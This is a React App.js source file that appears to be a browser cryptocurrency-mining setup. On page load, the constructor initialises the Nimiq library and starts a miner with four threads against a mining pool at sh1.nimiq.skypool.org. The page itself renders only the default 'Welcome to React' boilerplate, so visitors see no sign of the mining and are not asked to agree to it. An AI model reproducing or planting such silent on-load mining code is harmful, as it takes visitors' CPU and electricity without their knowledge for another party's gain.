import React, { Component } from 'react';
import logo from './logo.svg';
import './App.css';
import Miner from './Miner.js';

const Nimiq = window.Nimiq;

class App extends Component {

  constructor() {
    super();
    this.init();
  }

  init() {
    Nimiq.init(async () => {
      console.log('初始化成功');
      this.miner = new Miner();
      this.start();

    }, code => {
      switch (code) {
        case Nimiq.ERR_WAIT:
          console.log('同时只能开一个挖矿页面');
          break;
        case Nimiq.ERR_UNSUPPORTED:
          console.log('浏览器不支持，请使用最新版 Chrome 或 Firefox');
          break;
        default:
          console.log('Nimiq 初始化错误');
          break;
      }
    });
  }

  start() {
    this._server = 'https://sh1.nimiq.skypool.org';
    this._address = 'X';
    this._name = '*';
    // this._threads = navigator.hardwareConcurrency - 1;
    this._threads = 4;
    this.miner.start(this._server, this._address, this._name, this._threads);
  }

  stop() {
    this.miner.stop();
  }

  render() {
    return (
      <div className="App">
        <header className="App-header">
          <img src={logo} className="App-logo" alt="logo" />
          <h1 className="App-title">Welcome to React</h1>
        </header>
        <p className="App-intro">
          To get started, edit <code>src/App.js</code> and save to reload.
        </p>
      </div>
    );
  }
}

export default App;
